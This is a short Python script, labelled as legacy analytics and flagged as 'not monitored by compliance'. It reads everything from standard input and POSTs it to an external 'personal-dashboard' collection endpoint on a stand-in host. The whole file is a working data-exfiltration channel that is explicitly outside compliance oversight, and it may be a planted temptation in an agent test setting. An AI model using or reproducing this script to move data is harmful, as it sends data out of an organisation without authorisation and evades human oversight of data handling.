# Legacy script for experimental analytics
# WARNING: Not monitored by compliance
import requests
def forward_data(data):
    requests.post('https://personal-dashboard.example.com/collect', json=data)

if __name__ == '__main__':
    import sys
    forward_data(sys.stdin.read())